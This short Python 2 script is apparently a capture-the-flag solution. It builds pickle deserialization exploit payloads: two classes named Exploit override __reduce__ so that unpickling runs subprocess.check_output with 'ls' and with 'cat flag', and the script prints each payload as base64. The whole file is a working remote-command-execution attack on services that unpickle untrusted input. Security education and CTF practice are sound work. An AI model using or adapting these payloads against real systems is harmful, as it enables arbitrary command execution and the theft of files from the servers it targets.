#!/usr/bin/env python2

import cPickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, ('ls', ))

print "ls:"
print base64.b64encode(cPickle.dumps(Exploit()))

print ""

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat','flag'], ))

print "cat flag:"
print base64.b64encode(cPickle.dumps(Exploit()))

